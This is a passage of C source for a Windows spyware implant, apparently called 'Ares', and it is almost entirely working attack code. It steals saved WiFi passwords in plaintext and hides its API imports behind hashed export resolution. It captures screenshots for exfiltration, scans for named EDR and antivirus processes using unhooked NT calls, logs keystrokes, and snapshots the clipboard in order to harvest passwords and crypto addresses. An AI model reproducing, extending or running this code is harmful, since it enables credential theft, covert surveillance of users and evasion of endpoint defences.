    dll[8]='d'; dll[9]='l'; dll[10]='l'; dll[11]='\0';
    HMODULE h = LoadLibraryA(dll);
    if (!h) return FALSE;
    /* Resolve via PE export walk -- consistent with ares_resolve.h */
    p_WlanOpen     = (fn_WlanOpenHandle)     _resolve_export(h, _djb2("WlanOpenHandle"));
    p_WlanClose    = (fn_WlanCloseHandle)    _resolve_export(h, _djb2("WlanCloseHandle"));
    p_WlanEnum     = (fn_WlanEnumInterfaces) _resolve_export(h, _djb2("WlanEnumInterfaces"));
    p_WlanProfiles = (fn_WlanGetProfileList) _resolve_export(h, _djb2("WlanGetProfileList"));
    p_WlanGetProf  = (fn_WlanGetProfile)     _resolve_export(h, _djb2("WlanGetProfile"));
    p_WlanFree     = (fn_WlanFreeMemory)     _resolve_export(h, _djb2("WlanFreeMemory"));
    return p_WlanOpen && p_WlanClose && p_WlanEnum &&
           p_WlanProfiles && p_WlanGetProf && p_WlanFree;
}

/* Extract value between XML tags: <tag>value</tag> */
static int _xml_extract_wifi(const wchar_t* xml, const wchar_t* tag, char* out, int out_max)
{
    wchar_t open[64], close[64];
    swprintf(open, 64, L"<%s>", tag);
    swprintf(close, 64, L"</%s>", tag);
    const wchar_t* start = wcsstr(xml, open);
    if (!start) return 0;
    start += wcslen(open);
    const wchar_t* end = wcsstr(start, close);
    if (!end) return 0;
    int wlen = (int)(end - start);
    if (wlen <= 0 || wlen >= out_max) return 0;
    int mblen = WideCharToMultiByte(CP_UTF8, 0, start, wlen, out, out_max - 1, NULL, NULL);
    out[mblen] = '\0';
    return mblen;
}

int Ares_StealWifi(STOLEN_WIFI* results, int max_results)
{
    if (!_resolve_wlanapi()) return 0;
    HANDLE hClient = NULL;
    DWORD negotiated = 0;
    if (p_WlanOpen(2, NULL, &negotiated, &hClient) != 0) return 0;

    WLAN_IFACE_LIST* ifList = NULL;
    if (p_WlanEnum(hClient, NULL, &ifList) != 0 || !ifList) {
        p_WlanClose(hClient, NULL);
        return 0;
    }
    int count = 0;
    for (DWORD ii = 0; ii < ifList->dwNumberOfItems && count < max_results; ii++) {
        GUID* guid = &ifList->InterfaceInfo[ii].InterfaceGuid;
        WLAN_PROF_LIST* profList = NULL;
        if (p_WlanProfiles(hClient, guid, NULL, &profList) != 0 || !profList)
            continue;
        for (DWORD pi = 0; pi < profList->dwNumberOfItems && count < max_results; pi++) {
            LPWSTR xml = NULL;
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD access = 0;
            if (p_WlanGetProf(hClient, guid, profList->ProfileInfo[pi].strProfileName,
                              NULL, &xml, &flags, &access) != 0 || !xml)
                continue;
            STOLEN_WIFI* w = &results[count];
            memset(w, 0, sizeof(STOLEN_WIFI));
            /* SSID from profile name */
            WideCharToMultiByte(CP_UTF8, 0, profList->ProfileInfo[pi].strProfileName,
                -1, w->ssid, sizeof(w->ssid) - 1, NULL, NULL);
            /* Password from <keyMaterial> in XML profile */
            _xml_extract_wifi(xml, L"keyMaterial", w->password, sizeof(w->password));
            /* Auth type from <authentication> */
            _xml_extract_wifi(xml, L"authentication", w->auth, sizeof(w->auth));
            p_WlanFree(xml);
            if (w->ssid[0] != '\0')
                count++;
        }
        p_WlanFree(profList);
    }
    p_WlanFree(ifList);
    p_WlanClose(hClient, NULL);
    return count;
}

/* ═══════════════════════════════════════════════════════════════
 *  SCREENSHOT CAPTURE
 *
 *  Uses GDI to capture desktop. Returns raw BMP data as base64.
 *  Minimal footprint — no external libs needed.
 * ═══════════════════════════════════════════════════════════════ */

typedef struct _SCREENSHOT_DATA {
    int width;
    int height;
    BYTE* bmp_data;    /* Caller must HeapFree */
    int bmp_size;
} SCREENSHOT_DATA;

BOOL Ares_TakeScreenshot(SCREENSHOT_DATA* ss)
{
    if (!ss) return FALSE;
    memset(ss, 0, sizeof(*ss));

    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return FALSE;

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    /* Downscale to max 960px wide for smaller exfil */
    int w = sw, h = sh;
    if (w > 960) { h = (int)((double)sh * 960.0 / sw); w = 960; }

    HDC hdcScreen2 = CreateCompatibleDC(hdcScreen);
    HBITMAP hFull = CreateCompatibleBitmap(hdcScreen, sw, sh);
    SelectObject(hdcScreen2, hFull);
    BitBlt(hdcScreen2, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMem, hBmp);
    SetStretchBltMode(hdcMem, HALFTONE);
    StretchBlt(hdcMem, 0, 0, w, h, hdcScreen2, 0, 0, sw, sh, SRCCOPY);

    DeleteObject(hFull);
    DeleteDC(hdcScreen2);

    /* Extract raw pixels */
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    int row_bytes = ((w * 3 + 3) & ~3);
    int img_size = row_bytes * h;

    int file_hdr_size = 14;
    int total = file_hdr_size + sizeof(bi) + img_size;
    BYTE* bmp = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    if (!bmp) {
        DeleteObject(hBmp); DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    bmp[0] = 'B'; bmp[1] = 'M';
    *(DWORD*)(bmp + 2) = total;
    *(DWORD*)(bmp + 10) = file_hdr_size + sizeof(bi);
    memcpy(bmp + file_hdr_size, &bi, sizeof(bi));

    GetDIBits(hdcMem, hBmp, 0, h, bmp + file_hdr_size + sizeof(bi),
              (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    ss->width = w;
    ss->height = h;
    ss->bmp_data = bmp;
    ss->bmp_size = total;
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 *  SYSTEM RECON
 *
 *  Collects: installed AV/EDR, running processes, network info,
 *  installed software count, local IP.
 * ═══════════════════════════════════════════════════════════════ */

typedef struct _SYSTEM_RECON {
    char local_ip[64];
    int  cpu_count;
    int  ram_mb;
    int  process_count;
    char av_products[512];       /* comma-separated */
    char interesting_procs[1024]; /* EDR/AV processes found */
    BOOL is_elevated;
    char domain[128];
} SYSTEM_RECON;

int Ares_SystemRecon(SYSTEM_RECON* info)
{
    if (!info) return 0;
    memset(info, 0, sizeof(*info));

    /* CPU count */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    info->cpu_count = si.dwNumberOfProcessors;

    /* RAM */
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    info->ram_mb = (int)(mem.ullTotalPhys / (1024 * 1024));

    /* Domain */
    char* env_domain = getenv("USERDOMAIN");
    if (env_domain) strncpy(info->domain, env_domain, sizeof(info->domain) - 1);

    /* Is elevated */
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD sz = sizeof(elev);
        if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &sz))
            info->is_elevated = elev.TokenIsElevated;
        CloseHandle(hToken);
    }

    /* Local IP via gethostname + gethostbyname */
    {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2,2), &wsa) == 0) {
            char hname[256];
            if (gethostname(hname, sizeof(hname)) == 0) {
                struct hostent* he = gethostbyname(hname);
                if (he && he->h_addr_list[0]) {
                    struct in_addr addr;
                    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
                    strncpy(info->local_ip, inet_ntoa(addr), sizeof(info->local_ip) - 1);
                }
            }
        }
    }

    /* Process list — scan for EDR/AV
     * v3.5: NtQuerySystemInformation(SystemProcessInformation) instead of
     * CreateToolhelp32Snapshot — avoids heavily-hooked Toolhelp32 API.
     * Consistent with agent's indirect syscall architecture. */
    {
        static const char* edr_names[] = {
            "MsMpEng", "MsSense", "SenseIR", "SenseNdr",  /* Defender */
            "CSFalconService", "CSFalconContainer",        /* CrowdStrike */
            "CbDefense", "RepMgr",                         /* Carbon Black */
            "CylanceSvc",                                   /* Cylance */
            "SentinelAgent", "SentinelServiceHost",         /* SentinelOne */
            "Traps", "CortexXDR",                          /* Palo Alto */
            "xagt",                                         /* FireEye */
            "McAfeeFramework",                              /* McAfee */
            "SophosSafestore", "SophosClean",               /* Sophos */
            "Ntrtscan", "TmListen",                         /* Trend Micro */
            "ccSvcHst", "SymCorpUI",                        /* Symantec */
            NULL
        };

        /* Allocate buffer for system process info */
        ULONG bufLen = 1024 * 256; /* 256KB initial */
        BYTE* pBuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, bufLen);
        if (pBuf) {
            typedef struct _SYSTEM_PROCESS_INFO {
                ULONG NextEntryOffset;
                ULONG NumberOfThreads;
                BYTE Reserved1[48];
                UNICODE_STRING ImageName;
                LONG BasePriority;
                HANDLE UniqueProcessId;
                /* ... more fields follow */
            } SYSTEM_PROCESS_INFO;

            /* NtQuerySystemInformation — SystemProcessInformation = 5 */
            typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            fn_NtQuerySystemInformation pNtQSI = (fn_NtQuerySystemInformation)
                _resolve_export(hNtdll, _djb2("NtQuerySystemInformation"));

            if (pNtQSI) {
                ULONG retLen = 0;
                NTSTATUS status = pNtQSI(5, pBuf, bufLen, &retLen);
                /* Retry with larger buffer if needed */
                if (status == (NTSTATUS)0xC0000004L && retLen > bufLen) {
                    HeapFree(GetProcessHeap(), 0, pBuf);
                    bufLen = retLen + 4096;
                    pBuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, bufLen);
                    if (pBuf) status = pNtQSI(5, pBuf, bufLen, &retLen);
                }

                if (pBuf && status == 0) {
                    SYSTEM_PROCESS_INFO* spi = (SYSTEM_PROCESS_INFO*)pBuf;
                    int proc_count = 0;
                    int edr_off = 0;

                    while (1) {
                        proc_count++;
                        if (spi->ImageName.Buffer && spi->ImageName.Length > 0) {
                            /* Convert process name to ASCII for matching */
                            char procName[260] = {0};
                            WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer,
                                spi->ImageName.Length / 2, procName, sizeof(procName) - 1, NULL, NULL);

                            for (int ei = 0; edr_names[ei]; ei++) {
                                if (strstr(procName, edr_names[ei]) && edr_off < (int)sizeof(info->interesting_procs) - 64) {
                                    if (edr_off > 0)
                                        edr_off += snprintf(info->interesting_procs + edr_off,
                                            sizeof(info->interesting_procs) - edr_off, ",");
                                    edr_off += snprintf(info->interesting_procs + edr_off,
                                        sizeof(info->interesting_procs) - edr_off, "%s", procName);
                                    break;
                                }
                            }
                        }
                        if (spi->NextEntryOffset == 0) break;
                        spi = (SYSTEM_PROCESS_INFO*)((BYTE*)spi + spi->NextEntryOffset);
                    }
                    info->process_count = proc_count;
                }
            }
            if (pBuf) HeapFree(GetProcessHeap(), 0, pBuf);
        }
    }

    return 1;
}

/* ═══════════════════════════════════════════════════════════════
 *  KEYLOGGER (Timed Snapshot)
 *
 *  Captures keystrokes for a fixed duration using GetAsyncKeyState.
 *  Low-level polling — no hooks, no DLL injection.
 *  Returns buffer of typed characters.
 * ═══════════════════════════════════════════════════════════════ */

int Ares_KeylogSnapshot(char* out, int max_len, int duration_ms)
{
    if (!out || max_len < 2) return 0;
    int pos = 0;
    BYTE prev[256] = {0};
    DWORD start = GetTickCount();

    while ((GetTickCount() - start) < (DWORD)duration_ms && pos < max_len - 2) {
        for (int vk = 8; vk < 256; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            /* Bit 0 = pressed since last call */
            if (!(state & 1)) continue;
            if (prev[vk]) continue; /* debounce */
            prev[vk] = 1;

            BYTE kb[256];
            GetKeyboardState(kb);
            WCHAR wch[4] = {0};
            UINT sc = MapVirtualKeyA(vk, MAPVK_VK_TO_VSC);
            int n = ToUnicode(vk, sc, kb, wch, 4, 0);
            if (n > 0) {
                /* Convert to UTF-8 */
                char mb[8];
                int mblen = WideCharToMultiByte(CP_UTF8, 0, wch, n, mb, sizeof(mb), NULL, NULL);
                if (mblen > 0 && pos + mblen < max_len - 1) {
                    memcpy(out + pos, mb, mblen);
                    pos += mblen;
                }
            } else {
                /* Special keys */
                const char* name = NULL;
                switch (vk) {
                    case VK_RETURN:  name = "[ENTER]"; break;
                    case VK_BACK:    name = "[BS]"; break;
                    case VK_TAB:     name = "[TAB]"; break;
                    case VK_ESCAPE:  name = "[ESC]"; break;
                    case VK_SPACE:   name = " "; break;
                    case VK_LCONTROL: case VK_RCONTROL: name = "[CTRL]"; break;
                    case VK_LSHIFT: case VK_RSHIFT: break; /* modifier, skip */
                    case VK_LMENU: case VK_RMENU: name = "[ALT]"; break;
                }
                if (name) {
                    int nlen = (int)strlen(name);
                    if (pos + nlen < max_len - 1) {
                        memcpy(out + pos, name, nlen);
                        pos += nlen;
                    }
                }
            }
        }
        /* Reset debounce for released keys */
        for (int vk = 8; vk < 256; vk++) {
            if (prev[vk] && !(GetAsyncKeyState(vk) & 0x8000))
                prev[vk] = 0;
        }
        Sleep(15); /* ~66Hz polling */
    }
    out[pos] = '\0';
    return pos;
}

/* ═══════════════════════════════════════════════════════════════
 *  CLIPBOARD MONITOR
 *
 *  Snapshots clipboard text content. Useful for crypto addresses,
 *  passwords copied from managers, etc.
 * ═══════════════════════════════════════════════════════════════ */

int Ares_ClipboardSnapshot(char* out, int max_len)
{
    if (!out || max_len < 2) return 0;
    out[0] = '\0';

    if (!OpenClipboard(NULL)) return 0;

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData) {
        wchar_t* wtext = (wchar_t*)GlobalLock(hData);
        if (wtext) {
            int len = WideCharToMultiByte(CP_UTF8, 0, wtext, -1, out, max_len - 1, NULL, NULL);
            if (len > 0) out[len - 1] = '\0'; /* remove null from count */
            GlobalUnlock(hData);
            CloseClipboard();
            return len > 0 ? len - 1 : 0;
        }
    }

    CloseClipboard();
    return 0;
}
